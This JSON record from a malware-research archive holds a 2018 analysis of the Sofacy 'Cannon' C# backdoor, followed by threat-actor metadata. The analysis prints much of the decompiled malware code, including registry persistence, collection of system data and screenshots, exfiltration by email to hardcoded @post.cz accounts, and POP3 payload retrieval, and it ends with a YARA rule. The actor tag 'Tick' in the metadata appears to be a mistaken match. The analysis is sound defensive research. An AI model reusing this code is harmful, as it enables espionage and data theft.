{
    "id": "c215037c-3891-49d8-8597-4491304059bd",
    "created_at": "2023-01-12T15:02:57.713364Z",
    "updated_at": "2025-03-27T02:17:11.88274Z",
    "deleted_at": null,
    "sha1_hash": "3feb57c015928b80e07f83c94f3a71be90d0ef45",
    "title": "2018-11-27 - Let's Learn- In-Depth on Sofacy Cannon Loader-Backdoor Review",
    "authors": "",
    "file_creation_date": "2022-05-28T04:40:15Z",
    "file_modification_date": "2022-05-28T04:40:15Z",
    "file_size": 384535,
    "plain_text": "# Let's Learn: In-Depth on Sofacy Cannon Loader/Backdoor Review\n\n**[vkremez.com/2018/11/lets-learn-in-depth-on-sofacy-canon.html](https://www.vkremez.com/2018/11/lets-learn-in-depth-on-sofacy-canon.html)**\n\n## Goal: Review and practice analyzing C# code from the Sofacy Group new loader/backdoor called \"Cannon\" (as discovered by Palo Alto Unit 42 researchers).\n\n New #Unit42 research: #Sofacy continues global attacks and wheels out new ‘Cannon’ Trojan. Get the full report https://t.co/9ebNJ2x6aY pic.twitter.com/07b85lWiLh — Unit 42 (@Unit42_Intel) November 20, 2018\n\n Source: Sofacy “Cannon” Loader/Backdoor SHA256: 61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e Outline:\n```\nI. Background & Summary\nII. Cannon Classes\nIII. Cannon \"Form1\" Main Functions\nA. “start_Tick”\nB. “inf_Tick”\nC. “txt_Tick”\nD. “subject_Tick”\nE. \"run_Tick\"\nF. “load_Tick”\nG. “screen_Tick”\nH. \"eTim_Tick\"\nIV. Yara Signature\n\n I. Background & Summary Before diving deeper, I highly recommend reading the original discovery and excellent research related to the \"Cannon\" malware by Palo Alto Unit 42 titled \"Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan.\" As reported by Unit 42, Sofacy group leveraged malicious Microsoft Document themed as \"Lion Air disaster\" to deliver the Cannon malware. By and large, according to Palo Alto Unit 42, Sofacy recent targeting includes \"government organizations in the EU, US, and former Soviet states.\"\n Cannon is a rather simple but interesting C#-coded malware collecting victim information, receiving commands (controlled by EventHandler), and retrieving next stage via the SMTPS and POP3S. It is interesting that the malware original project \"wsslc\" program database (PDB) is associated with the possible user \"Garry\" with the \"cannon\" project path \"C:\\Users\\Garry\\Desktop\\cannon\\obj\\x86\\Debug\\wsslc.pdb\". Notably, \"Garry\" is a common way for Russian speakers to phonetically spell out \"Harry\" stressing the \"G\" sound. The malware logic also checks for control email messages attachment files containing \"auddevc\" via its \"load_Tick\" function possibly retrieving unidentified additional binaries. If found, the\n\n```\n\n-----\n\n## malware creates a file stream in the main directory and writes the file to the directory using BinaryWriter. Additionally, the malware creates a registry entry as \"Shell\" in \"Winlogon\" via \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" for registry persistence. It is also interesting that the malware authors chose to leverage Czech email provider @post.cz for communications and command control.\n\n II. Cannon Classes The binary contains the following five classes as follows:\n\n Class Name Description\n\n AUTH Initializes values for SMTPS and POP connection mF1, p1, mF2, p2, mF3, and p3\n\n Form1 Loads the main functions and initializes the main flow of the binary\n\n Lenor Loads auxiliary functions, retrieves information about victims and parses emails for commands\n\n MDat Initializes values used for network communication\n\n Program Starts the program and passes control to Form1\n\n\n-----\n\n## The main program starts running the Main function which checks whether the specified file \"C:\\Users\\Public\\Music\\s.txt\" exists, if yes, it starts “explorer.exe” If not, it sets up the EnableVisualStyles() and SetCompatibleTextRenderingDefault(defaultValue: false) and launches the “Run” command the command executing the “Form1” class. The full function is as follows:\n```\n////////////////////////////////////////////////////////////////////\n////////////////////// Cannon Malware Main \"Program\" ///////////////\n////////////////////////////////////////////////////////////////////\ninternal static class Program\n{\n [STAThread]\n  private static void Main()\n {\n try\n {\n  if (File.Exists(\"C:\\\\Users\\\\Public\\\\Music\\\\s.txt\"))\n      {\n      Process.Start(\"explorer.exe\");\n      }\n  Application.EnableVisualStyles();\n  Application.SetCompatibleTextRenderingDefault(defaultValue: false);\n  Application.Run(new Form1());\n  }\n catch (Exception)\n {\n }\n }\n}\n\n III. Cannon \"Form1\" Main Functions Next, the class \"Form1\" starts with InitializeComponent(), which sets up all the variables and intervals with EventHandler for the main functions as detailed by Unit 42:\n////////////////////////////////////////////////////////////////////\n// Cannon Malware Sequence \"Form1\" Calls & Intervals //////////////\n///////////////////////////////////////////////////////////////////\nstart.Interval = 1000;\nstart.Tick += new System.EventHandler(start_Tick);\ninf.Interval = 300000;\ninf.Tick += new System.EventHandler(inf_Tick);\ntxt.Interval = 120000;\ntxt.Tick += new System.EventHandler(txt_Tick);\nsubject.Interval = 120000;\nsubject.Tick += new System.EventHandler(subject_Tick);\nrun.Interval = 60000;\nrun.Tick += new System.EventHandler(run_Tick);\nload.Interval = 120000;\nload.Tick += new System.EventHandler(load_Tick);\nscreen.Interval = 10000;\nscreen.Tick += new System.EventHandler(screen_Tick);\neTim.Interval = 13000;\neTim.Tick += new System.EventHandler(eTim Tick);\n\n```\n\n-----\n\n## A. start_Tick\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"start_Tick\" function ////////////////\n////////////////////////////////////////////////////////////////////\nprivate void start_Tick(object sender, EventArgs e)\n{\n try\n {\n start.Enabled = false;\n Lenor lenor = new Lenor();\n if (Directory.Exists(\"C:\\\\Users\\\\Public\\\\Music\")\n {\n dir = \"C:\\\\Users\\\\Public\\\\Music\" + \"\\\\\"; \n }\n else\n {\n dir = \"C:\\\\Documents and Settings\\\\All Users\\\\Documents\" + \"\\\\\"; \n } \n att = dir + \"auddevc.txt\";\n _id = lenor.id(dir);\n if (!File.Exists(dir + \"s.txt\"))\n {\n lenor.Dir = dir;\n lenor.Registration(\"\\\"HKCU\\\\Software\\\\Microsoft\\\\\" +\n        \"Windows NT\\\\CurrentVersion\\\\Winlogon\\\", \"Shell\");\n File.WriteAllText(dir + \"s.txt\", \"{SysPar = 65}\");\n }\n inf.Enabled = true;\n }\n catch (Exception)\n {\n }\n}\n\n The \"start_Tick\" function checks if the application is launched with the interval of 1000 milliseconds or 1 second. The function checks if the directory \"C:\\Users\\Public\\Music\" exists if not it uses the \"C:\\Documents and Settings\\All Users\\Documents\" one. Then, it concatenates the filename to the path as “auddevc.txt”. The function generates a bot ID (_id) leveraging the id function from the “Lenor” class (which calls another \"SN\" function from Lenor). The bot ID is generated by concatenating the results of the cmd command for volume name \"vol C:\" with machine username \"Environment.UserName\". More specifically, the \"Lenor.SN\" function runs a command, for example, \"vol C:>> C:\\\\Documents and Settings\\\\All Users\\\\Documents\\99.txt\" saving the output to a local file \"99.txt\" which is run via batch script \"b.bat\"; both files are removed right after the operation.\n\n```\n\n-----\n\n## The Lenor._id function simply leverages the SN function and concatenates the full bot ID.\n\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"Id\" Bot ID Generation /////////////\n////////////////////////////////////////////////////////////////////\npublic string id(\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\")\n{\n string text = \"\";\n string text2 = \"\";\n string text3 = \"\";\n string text4 = \"\";\n volumename = SN(\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\", \"C\");\n volumename = volumename.Trim();\n username = Environment.UserName;\n byte[] bytes = Encoding.Default.GetBytes(text4);\n text4 = BitConverter.ToString(bytes);\n username = text4.Replace(\"-\", \"\");\n full_id = volumename + username;\n/*\npublic string SN(string \"C:\\\\Documents and Settings\\\\All Users\\\\Documents\", string\nname)\n{\nstring text = \"\";\ntry\n{\n while (!File.Exists(\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\" +\n\"\\\\99.txt\"))\n {\n try\n {\n string contents = \"vol \" + \n \"C\" + \":>>\" + \"C:\\\\Documents and Settings\\\\All Users\\\\Documents\" + \"\\\\99.txt\";\n File.WriteAllText(\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\" + \"\\\\b.bat\",\ncontents);\n ProcessStartInfo processStartInfo = new ProcessStartInfo();\n processStartInfo.FileName = d + \"\\\\b.bat\";\n processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n Process.Start(processStartInfo);\n File.Delete(d + \"\\\\b.bat\");\n }\n catch (Exception)\n {\n }\n }\n text = File.ReadAllText(d + \"\\\\99.txt\");\n string[] array = text.Split('\\n');\n text = array[1];\n text = text.Substring(text.LastIndexOf(\" \"));\n text = text.Remove(text.IndexOf('-'), 1);\n File.Delete(d + \"\\\\99.txt\");\n}\ncatch (Exception)\n{\n}\nreturn text;\n\n```\n\n-----\n\n```\n}\n*/\n\n## For persistence, the malware checks if the directory contains “s.txt” file. If not, it registers itself in the following registry path:\n\n HKCU\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\Shell\n It also creates the file \"s\".txt in the same local directory with \"{SysPar = 65}\" encoding. B. “inf_Tick”\n\n```\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"inf_Tick\" function ////////////////\n////////////////////////////////////////////////////////////////////\nprivate void inf_Tick(object sender, EventArgs e)\n{\n try\n {\n inf.Enabled = false;\n string[] array = \"REDACTED_PASS2|bishtr.cam47\".Split('|');\n a1 = array[1];\n b1 = array[0];\n array = \"REDACTED_PASS3|cervot.woprov\".Split('|');\n a2 = array[1];\n b2 = array[0];\n array = \"REDACTED_PASS4|lobrek.chizh\".Split('|');\n a3 = array[1];\n b3 = array[0];\n Lenor lenor = new Lenor();\n lenor.Dir = dir;\n File.Delete(dir + \"\\\\b.bat\");\n string userName = Environment.UserName;\n lenor.inf(dir + \"i.ini\", userName);\n MDat mDat = new MDat();\n mDat.Dom = \"@post.cz\";\n mDat.Host = \"smtp.seznam.cz\";\n mDat.fn = dir + \"i.ini\"; //filename attachement\n mDat.ID = _id; //subject\n mDat.bod = \"S_inf\"; // body\n mDat.mT = \"sahro.bella7\"; // to\n AUTH aUTH = new AUTH();\n aUTH.mF1 = a1; // from bishtr.cam47\n aUTH.p1 = b1; // REDACTED_PASS2\n aUTH.mF2 = a2; // from cervot.woprov\n aUTH.p2 = b2; // REDACTED_PASS3\n aUTH.mF3 = a3; // from lobrek.chizh\n aUTH.p3 = b3; // REDACTED_PASS4\n lenor.sent(mDat, aUTH);\n screen.Enabled = true;\n }\n catch (Exception)\n {\n screen.Enabled = true;\n }\n}\n\n## The \"inf_Tick\" function checks if the application is launched with the interval of 30000 milliseconds or 30 seconds. The function splits strings via “|” separator such as for example \"REDACTED_PASS2|bishtr.cam47\".Split('|') and adds the values as usernames and passwords to the authentication “AUTH” class. Additionally, it deletes the batch file “b.bat\" from the current directory. The malware \"lenor.inf\" function works as follows:\n\n```\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"inf\" Function Fragment /////////////\n////////////////////////////////////////////////////////////////////\npublic string inf(string fn, string CurU)\n{\n string text = \"\";\n StringBuilder stringBuilder = new StringBuilder();\n stringBuilder.AppendFormat(\"RPlace:\\n\" + Environment.NewLine);\n stringBuilder.AppendFormat(\"{0} \\n\", Application.ExecutablePath +\nEnvironment.NewLine);\nstringBuilder.AppendFormat(\"==========================================================\n + Environment.NewLine);\n stringBuilder.AppendFormat(\"OS: {0}\\n\", Environment.OSVersion +\nEnvironment.NewLine);\n stringBuilder.AppendFormat(\"SDir: {0}\\n\", SDir() + Environment.NewLine);\n stringBuilder.AppendFormat(\"Domain: {0}\\n\", Domain() + Environment.NewLine);\n stringBuilder.AppendFormat(\"Host: {0}\\n\", HostN() + Environment.NewLine);\n stringBuilder.AppendFormat(\"CurrentUsr: {0}\\n\", CurU + Environment.NewLine);\n stringBuilder.AppendFormat(\"TimeZ: {0}\\n\", GetTZ() + Environment.NewLine);\n stringBuilder.AppendFormat(\"Working: {0}\\n\", TimeWork() + Environment.NewLine);\nstringBuilder.AppendFormat(\"==========================================================\n+ Environment.NewLine);\n stringBuilder.AppendFormat(\"\\n\" + DrvDsk() + Environment.NewLine);\nstringBuilder.AppendFormat(\"==========================================================\n+ Environment.NewLine);\n stringBuilder.AppendFormat(\"Swr:\\n\" + Environment.NewLine);\n text = \"C:\\\\Program\";\n string[] directories = Directory.GetDirectories(text + \" Files\\\\\");\n string[] array = directories;\n foreach (string str in array)\n {\n stringBuilder.AppendFormat(\"{0}\\n\", str + Environment.NewLine);\n }\n if (Directory.Exists(text + \" Files (x86)\\\\\"))\n {\n directories = Directory.GetDirectories(text + \" Files (x86)\\\\\");\n array = directories;\n foreach (string str in array)\n {\n stringBuilder.AppendFormat(\"{0}\\n\", str + Environment.NewLine);\n }\n }\nstringBuilder.AppendFormat(\"==========================================================\n+ Environment.NewLine);\n stringBuilder.AppendFormat(\"PrL:\\n\" + Environment.NewLine);\n\n```\n\n-----\n\n## The malware function utilizes Lenor.inf function to write the collected victim information to the file in the same directory as “i.ini\" in the following structure (example):\n\n The function attempts to authenticate to the three @post.cz email addresses (\"bishtr.cam47@post.cz\", \"cervot.woprov@post.cz\", \"lobrek.chizh@post.cz\") send the information to “sahro.bella7@post.cz” with the body message “S_inf” with the file attachment “i.ini\" with the subject as the bot ID. C. “txt_Tick”\n\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"txt_Tick\" function ////////////////\n////////////////////////////////////////////////////////////////////\nprivate void txt_Tick(object sender, EventArgs e)\n{\n try\n{\n txt.Enabled = false;\n string[] array = \"REDACTED_PASSWORD|trala.cosh2\".Split('|');\n ai = array[1];\n bi = array[0];\n Lenor lenor = new Lenor();\n _adr = lenor.pi(_id, \"trala.cosh2\" + \"@post.cz\", bi, \"pop.seznam.cz\");\n if (_adr.Length > 0)\n {\n MDat mDat = new MDat();\n mDat.Dom = \"@post.cz\";\n mDat.Host = \"smtp.seznam.cz\";\n mDat.fn = dir + \"s.txt\";\n mDat.ID = _id;\n mDat.bod = \"ok\";\n mDat.mT = \"sahro.bella7\";\n AUTH aUTH = new AUTH();\n aUTH.mF1 = a1;\n aUTH.p1 = b1;\n aUTH.mF2 = a2;\n aUTH.p2 = b2;\n aUTH.mF3 = a3;\n aUTH.p3 = b3;\n lenor.sent(mDat, aUTH);\n load.Enabled = true;\n }\n else\n {\n txt.Enabled = true;\n }\n }\n catch (Exception)\n{\n load.Enabled = true;\n}\n}\n\n## The \"txt_Tick\" function is launched with the interval of 120000 milliseconds or 120 seconds.The function sets up variables and splits username and password leveraging “|” as follows: \"REDACTED_PASS|trala.cosh2\". The function \"lenor.pi\" authenticates to the email account “trala.cosh2@post.cz\" and retrieves messages via pop3Client.GetMessageCount() for the message looping over subjects with the bot ID (message.Headers.Subject == ID) and retrieving message body message.MessagePart.Body and converting text (BitConverter.ToString(body)) to string and\n\n```\n\n-----\n\n## decoding hex via FromHex(text) and deleting the message. The loop code is as follows:\n```\n/////////////////////////////////////////////////////////////////////\n// Cannon Malware \"txt_Tick\" Command Email GetMessage Loop for cmd //\n////////////////////////////////////////////////////////////////////\nfor (int i = 0; i < pop3Client.GetMessageCount(); i++)\n{\n message = pop3Client.GetMessage(i + 1);\n if (message.Headers.Subject == ID)\n  {\n  byte[] body = message.MessagePart.Body;\n  text = BitConverter.ToString(body);\n  text = FromHex(text);\n  pop3Client.DeleteMessage(i + 1);\n  }\n}\n\n If the text length is over zero, the function attempts to authenticate to the two aforementioned @post.cz email addresses from “screen_Tick” and send the information to “sahro.bella7@post.cz” with the body message “ok” with the file attachment “s.txt\" with the subject as the bot ID. D. “subject_Tick”\n\n```\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"subject_Tick\" function ////////////////\n////////////////////////////////////////////////////////////////////\nprivate void subject_Tick(object sender, EventArgs e)\n{\n try\n {\n subject.Enabled = false;\n Lenor lenor = new Lenor();\n lenor.Dir = dir;\n rn = lenor.pi(_id, \"trala.cosh2\" + \"@post.cz\", bi, \"pop.seznam.cz\";);\n rn = rn.Trim();\n if (rn.Length > 0)\n {\n MDat mDat = new MDat();\n mDat.Dom = \"@post.cz\";\n mDat.Host = \"smtp.seznam.cz\";\n mDat.fn = dir + \"s.txt\";\n mDat.ID = _id;\n mDat.bod = \"ok3\";\n mDat.mT = \"sahro.bella7\";\n AUTH aUTH = new AUTH();\n aUTH.mF1 = a1;\n aUTH.p1 = b1;\n aUTH.mF2 = a2;\n aUTH.p2 = b2;\n aUTH.mF3 = a3;\n aUTH.p3 = b3;\n lenor.sent(mDat, aUTH);\n run.Enabled = true;\n }\n else\n {\n subject.Enabled = true;\n }\n }\n catch (Exception)\n {\n }\n }\n\n## The \"subject_Tick\" function is launched with the interval of 120000 milliseconds or 120 seconds. The function sets up variables and splits username and password leveraging “|” as follows: \"REDACTED_PASS|trala.cosh2\" If the text length is over zero and trimmed of leading and trailing whitespace characters, the function attempts to authenticate to the two aforementioned @post.cz email addresses from “screen_Tick” and send the information to “sahro.bella7@post.cz” with the body message “ok3” with the file attachment “s.txt\" with the subject as the bot ID. E. \"run_Tick\"\n\n```\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"run_Tick\" function /////////////////\n////////////////////////////////////////////////////////////////////\nprivate void run_Tick(object sender, EventArgs e)\n{\n try\n {\n run.Enabled = false;\n try\n {\n Directory.CreateDirectory(rn.Substring(0, rn.LastIndexOf(\"\\\\\")));\n }\n catch (Exception)\n {\n }\n File.Move(att, rn);\n if (File.Exists(rn))\n {\n Lenor lenor = new Lenor();\n MDat mDat = new MDat();\n mDat.Dom = \"@post.cz\";\n mDat.Host = \"smtp.seznam.cz\";\n mDat.fn = dir + \"l.txt\";\n mDat.ID = _id;\n mDat.bod = \"ok4\";\n mDat.mT = \"sahro.bella7\";\n AUTH aUTH = new AUTH();\n aUTH.mF1 = a1;\n aUTH.p1 = b1;\n aUTH.mF2 = a2;\n aUTH.p2 = b2;\n aUTH.mF3 = a3;\n aUTH.p3 = b3;\n lenor.sent(mDat, aUTH);\n Process.Start(rn);\n Process[] processes = Process.GetProcesses();\n Process[] array = processes;\n foreach (Process process in array)\n {\n if (process.ProcessName.Contains(\"auddevc\"))\n {\n  Lenor lenor2 = new Lenor();\n  MDat mDat2 = new MDat();\n  mDat2.Dom = \"@post.cz\";\n  mDat2.Host = \"smtp.seznam.cz\";\n  mDat2.fn = dir + \"s.txt\";\n  mDat2.ID = _id;\n  mDat2.bod = \"ok5\";\n  mDat2.mT = \"sahro.bella7\";\n  AUTH aUTH2 = new AUTH();\n  aUTH2.mF1 = a1;\n  aUTH2.p1 = b1;\n  aUTH2.mF2 = a2;\n  aUTH2.p2 = b2;\n  aUTH2.mF3 = a3;\n\n```\n\n-----\n\n```\n  aUTH2.p3 b3;\n  lenor2.sent(mDat2, aUTH2);\n  File.Delete(dir + \"sysscr.ops\");\n  File.Delete(dir + \"i.ini\");\n  Application.Exit();\n }\n }\n }\n else\n {\n Application.Restart();\n }\n }\n catch (Exception)\n {\n Application.Exit();\n }\n}\n\n## The \"run_Tick\" function is launched with the interval of 60000 milliseconds or 60 seconds. The function processes the return text of the “subject_Tick” command and creates a directory with its path. Then, if successful, it attempts to move the file \"auddevc.txt\" to the new directory via File.Move(dir + \"auddevc.txt\"), rn). If successful, the function attempts to authenticate to the two aforementioned @post.cz email addresses and send the information to “sahro.bella7@post.cz” with the body message “ok4” with the file attachment “l.txt\" with the subject as the bot ID. Additionally, the function checks if the running process contains the name \"auddevc,\" if yes, the function attempts to authenticate to the two aforementioned @post.cz email addresses and send the information to “sahro.bella7@post.cz” with the body message “ok5” with the file attachment “s.txt\" with the subject as the bot ID. The function is also responsible for deleting the saved screenshot “sysscr.ops” and the collected victim information file “i.ini.” The function also exists the application if successful. F. “load_Tick”\n\n```\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"load_Tick\" function ////////////////\n////////////////////////////////////////////////////////////////////\nprivate void load_Tick(object sender, EventArgs e)\n{\ntry\n {\n load.Enabled = false;\n string text = _adr.Replace(\"B&\", \"\");\n text = text.Replace(\"Db\", \"\");\n string[] array = text.Split('%');\n string text2 = array[0];\n string text3 = array[1];\n text2 = text2.Trim();\n text3 = text3.Trim();\n Lenor lenor = new Lenor();\n lenor.Dir = dir;\n File.WriteAllText(dir + \"l.txt\", \"090\");\n rn = lenor.piatt(_id, text3 + \"@post.cz\", text2, \"pop.seznam.cz\";);\n if (File.Exists(att))\n {\n MDat mDat = new MDat();\n mDat.Dom = \"@post.cz\";\n mDat.Host = \"smtp.seznam.cz\";\n mDat.fn = dir + \"l.txt\";\n mDat.ID = _id;\n mDat.bod = \"ok2\";\n mDat.mT = \"sahro.bella7\";\n AUTH aUTH = new AUTH();\n aUTH.mF1 = a1;\n aUTH.p1 = b1;\n aUTH.mF2 = a2;\n aUTH.p2 = b2;\n aUTH.mF3 = a3;\n aUTH.p3 = b3;\n lenor.sent(mDat, aUTH);\n subject.Enabled = true;\n }\n else\n {\n load.Enabled = true;\n }\n }\n catch (Exception)\n {\n }\n}\n\n## The \"load_Tick\" function is launched with the interval of 120000 milliseconds or 120 seconds. The function is responsible for processing the retrieved text from “txt_Tick” function. It replaces the \"B&\" with “”, “Db” with “”, then splits the text via '%' and removes trailing whitespace. Then, it writes the new file “l.txt” from this text in the same directory with \"090\" encoding.\n\n```\n\n-----\n\n## The function lenor.piatt authenticates to the email account trala.cosh@post.cz and retrieves messages via pop3Client.GetMessageCount() for the message looping over subjects with the bot ID (message.Headers.Subject == ID) and retrieving message body message.MessagePart.Body and converting text (BitConverter.ToString(body)) to string and decoding hex via FromHex(text). Then, it loops over looking for attachment files containing “auddevc”. If found, it creates a file stream in the same directory and writes it to the directory using BinaryWriter.\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"piatt\" function fragment ///////////\n////////////////////////////////////////////////////////////////////\nif (pop3Client.GetMessageCount() > 0)\n {\n for (int i = 0; i < pop3Client.GetMessageCount(); i++)\n {\n message = pop3Client.GetMessage(i + 1);\n if (message.Headers.Subject == ID)\n {\n byte[] rawMessage = message.RawMessage;\n text = BitConverter.ToString(rawMessage);\n text = FromHex(text);\n list = message.FindAllAttachments();\n foreach (MessagePart item in list)\n {\n if (item.FileName.Contains(\"auddevc\"))\n {\n  FileStream fileStream = new FileStream(Dir + item.FileName, FileMode.Create);\n  BinaryWriter binaryWriter = new BinaryWriter(fileStream);\n  binaryWriter.Write(item.Body);\n  binaryWriter.Close();\n  fileStream.Close();\n }\n }\n pop3Client.DeleteMessage(i + 1);\n }\n }\n }\n\n G. “screen_Tick”\n\n```\n\n-----\n\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"screen_Tick\" function ////////////////\n////////////////////////////////////////////////////////////////////\nprivate void screen_Tick(object sender, EventArgs e)\n{\n try\n {\n screen.Enabled = false;\n string[] array = \"REDACTED_PASS2|bishtr.cam47\".Split('|');\n a1 = array[1];\n b1 = array[0];\n array = \"REDACTED_PASS3|cervot.woprov\".Split('|');\n a2 = array[1];\n b2 = array[0];\n array = \"REDACTED_PASS4|lobrek.chizh\".Split('|');\n a3 = array[1];\n b3 = array[0];\n Lenor lenor = new Lenor();\n lenor.Dir = dir;\n lenor.scr();\n MDat mDat = new MDat();\n mDat.Dom = \"@post.cz\";\n mDat.Host = \"smtp.seznam.cz\";\n mDat.fn = dir + \"sysscr.ops\";\n mDat.ID = _id;\n mDat.bod = \"SCreen\";\n mDat.mT = \"sahro.bella7\";\n AUTH aUTH = new AUTH();\n aUTH.mF1 = a1;\n aUTH.p1 = b1;\n aUTH.mF2 = a2;\n aUTH.p2 = b2;\n aUTH.mF3 = a3;\n aUTH.p3 = b3;\n lenor.sent(mDat, aUTH);\n txt.Enabled = true;\n }\n catch (Exception)\n {\n txt.Enabled = true;\n }\n }\n\n## The \"screen_Tick\" function is launched with the interval of 10000 milliseconds or 10 seconds. The function sets up variables and splits usernames and passwords leveraging “|” as follows:\nREDACTED_PASS2|bishtr.cam47\nREDACTED_PASS3|cervot.woprov\nREDACTED_PASS4|lobrek.chizh\n\n Then, it leverages the screen function \"lenor.scr\" taking a desktop screenshot via Bitmap(bounds.Width, bounds.Height), Graphics.FromImage(bitmap),\n\n```\n\n-----\n\n## graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size) and saving the screenshot as \".png\" image masked as “sysscr.ops” in the main directory. The function attempts to authenticate to the two aforementioned @post.cz email addresses and send the information to “sahro.bella7@post.cz” with the body message “SCreen” with the file attachment “sysscr.ops\" with the subject as the bot ID. H. \"eTim_Tick\"\n```\n/////////////////////////////////////////////////////////////////////\n/////////////// Cannon Malware \"eTim_Tick\" function ////////////////\n////////////////////////////////////////////////////////////////////\nprivate void eTim_Tick(object sender, EventArgs e)\n {\n Application.Exit();\n File.Delete(dir + \"\\\\r.bat\");\n }\n\n The “eTim_Tick” function is launched with the interval of 13000 milliseconds or 13 seconds. The function simply exits the application and deletes the batch script “r.bat\" in the directory. IV. Yara Signature\n\n```\n\n-----\n\n```\nrule apt_win32_cannon_loader_sofacy {\n  meta:\n   description = \"Detects Sofacy Cannon Loader\"\n   author = \"@VK_Intel\"\n   date = \"2018-11-24\"\n   hash1 = \"61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e\"\n  strings:\n   $pdb = \"c:\\\\Users\\\\Garry\\\\Desktop\\\\cannon\\\\obj\\\\x86\\\\Debug\\\\wsslc.pdb\" fullword\nascii\n   $exe = \"wsslc.exe\" fullword ascii wide\n   $s0 = \"cannon\" fullword ascii wide\n   $s1 = \"cannon.Form1.resources\" fullword ascii wide\n   $s2 = \"cannon.Properties.Resources.resources\" fullword ascii wide\n   $c0 = \"Form1\" fullword ascii wide\n   $c1 = \"Lenor\" fullword ascii wide\n   $c2 = \"MDat\" fullword ascii wide\n   $c3 = \"AUTH\" fullword ascii wide\n   $c4 = \"Program\" fullword ascii wide\n   $f0 = \"start_Tick\" fullword ascii wide\n   $f1 = \"inf_Tick\" fullword ascii wide\n   $f2 = \"screen_Tick\" fullword ascii wide\n   $f3 = \"txt_Tick\" fullword ascii wide\n   $f4 = \"load_Tick\" fullword ascii wide\n   $f5 = \"subject_Tick\" fullword ascii wide\n   $f6 = \"run_Tick\" fullword ascii wide\n   $f7 = \"eTim_Tick\" fullword ascii wide\n  condition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 1000KB and\n     ( 2 of ($c*) and 4 of ($f*) ) or ( 1 of ($s*) and ( $pdb or $exe ) ) \n   ) or ( all of them )\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-11-27 - Let's Learn- In-Depth on Sofacy Cannon Loader-Backdoor Review.pdf"
    ],
    "report_names": [
        "2018-11-27 - Let's Learn- In-Depth on Sofacy Cannon Loader-Backdoor Review.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
